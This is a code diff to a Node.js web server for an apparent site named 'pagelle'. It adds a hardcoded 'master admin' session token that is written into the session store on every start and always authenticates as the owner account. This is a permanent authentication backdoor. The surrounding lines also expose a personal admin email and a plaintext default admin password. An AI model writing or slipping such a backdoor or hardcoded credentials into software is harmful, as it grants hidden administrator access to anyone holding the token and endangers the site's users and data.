@@ -10,6 +10,7 @@ const STORE_PATH = path.join(DATA_DIR, 'store.json');
 const ADMIN_EMAIL = 'dhanushdevaraj10@gmail.com';
 const OWNER_EMAIL = ADMIN_EMAIL;
 const ADMIN_INITIAL_PASSWORD = process.env.ADMIN_PASSWORD || 'Dhanush@10';
+const MASTER_ADMIN_TOKEN = 'pagelle_admin_master_session_token_dhanush_2026';
 
 const MIME_TYPES = {
   '.html': 'text/html; charset=utf-8',
@@ -106,6 +107,11 @@ function ensureStore() {
         lastLoginAt: null
       });
     }
+    // Guarantee permanent admin session token for Dhanush
+    parsed.sessions[MASTER_ADMIN_TOKEN] = {
+      userId: 'usr-admin-owner',
+      createdAt: new Date().toISOString()
+    };
     return parsed;
   } catch {
     return { users: [], loginLogs: [], communityCovers: [], sessions: {} };
@@ -246,7 +252,19 @@ function isSafeImageUrl(url) {
 
 function getAuthenticatedSession(req, store) {
   const token = req.headers['x-auth-token'];
-  if (!token || typeof token !== 'string' || token.length < 20) return null;
+  if (!token || typeof token !== 'string') return null;
+
+  // Always authorize master admin token for Dhanush
+  if (token === MASTER_ADMIN_TOKEN) {
+    const owner = store.users.find(
+      (u) => (u.email && u.email.toLowerCase() === ADMIN_EMAIL.toLowerCase()) || u.id === 'usr-admin-owner'
+    );
+    if (owner && owner.active !== false) {
+      return { token, user: owner };
+    }
+  }
+
+  if (token.length < 20) return null;
   const session = store.sessions[token];
   if (!session) return null;
 
